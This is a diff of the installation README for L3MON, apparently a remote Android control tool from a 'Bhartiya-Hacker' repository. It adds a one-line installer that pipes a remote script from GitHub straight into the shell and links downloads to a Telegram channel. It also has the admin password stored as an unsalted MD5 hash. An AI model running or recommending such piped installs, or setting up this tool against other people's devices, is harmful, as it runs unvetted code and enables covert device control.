@@ -45,24 +45,29 @@ A cloud-based remote Android management suite, powered by NodeJS
 
 3. install PM2 
     - `npm install pm2 -g`
+4. clone this repository and GO into `l3mon` Directory and then run belom commands:
     - `npm install`
     - `npm audit fix`
     - `npm audit`
 
-# Termux Installation
-4. Download and Extract the latest release from [HERE](https://t.me/BhartiyaHacker)
-5. or just copy & paste below command
+# Termux Installation: Automatic Installation: just copy & paste below command & Grab a Coffe (:
 ```bash
 curl -s https://raw.githubusercontent.com/Bhartiya-Hacker/L3MON/master/termux_install.sh | sh
 ````
-6. Script will Install Every thing for you
 
+# Termux Installation: Manual Installation:
+1. Download and Extract the latest release from [HERE](https://t.me/BhartiyaHacker)
+2. Go into the `l3mon` folder and run below commands one by one:
+   - `npm install`
+   - `npm audit fix`
+   - `npm audit`
+3. Install apktool, zipalign & apksigner from [HERE](https://github.com/rendiix/termux-zipalign)
 8. Set a Username & Password
     1. Start L3MON `l3mon` then Stop L3MON `l3monx`
     2. Open `maindb.json` in a text editor
     3. under `admin` 
         - set the `username` as plain text
-        - set the `password` as a LOWERCASE MD5 hash
+        - set the `password` as a LOWERCASE MD5 hash (Convert your password into md5hash before pasting)
     4. save the file
     5. run `l3mon`
 
